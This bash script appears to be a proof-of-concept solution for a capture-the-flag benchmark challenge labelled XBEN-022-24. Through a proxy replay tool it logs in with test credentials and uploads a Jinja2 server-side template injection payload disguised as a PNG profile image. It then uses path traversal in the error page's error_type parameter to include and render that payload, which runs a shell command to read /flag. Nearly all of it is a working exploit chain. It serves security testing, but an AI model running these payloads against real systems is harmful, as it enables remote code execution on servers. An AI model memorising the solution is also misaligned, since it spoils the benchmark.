#!/usr/bin/env bash
# XBEN-022-24 — authenticated upload then SSTI via template include. Proxy-mode
# twin. Log in, upload a "profile image" whose bytes are a Jinja2 payload, then
# make the error page include it from static/images via a path that steps out of
# templates/ but stays inside static/. The template renders and runs the payload
# (cat /flag). Login and upload are both replays, so they share the cookie jar.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
NAME="poc-$$.html"
SESSION="xben022p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
# 1. Log in (test/test) so the session holds a real cookie.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' \
  --set 'form.username=test' --set 'form.password=test' >/dev/null
# 2. Upload the template. Every field is a multipart part (the handler reads the
#    form fields before the file).
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/update_profile' \
  --set 'multipart.name=a' --set 'multipart.lastname=b' --set 'multipart.email=a@b.c' \
  --set 'multipart.loan_amount=1' --set 'multipart.loan_term_months=1' \
  --set 'multipart.monthly_payment=1' \
  --set "multipart.image_profile={{lipsum.__globals__.os.popen('cat /flag').read()}}" \
  --set "multipart.image_profile.filename=$NAME" \
  --set 'multipart.image_profile.content_type=image/png' >/dev/null
# 3. Ask the error page to include it.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/error' \
  --set 'query.message=x' --set "query.error_type=../images/$NAME" >/dev/null
print_flag
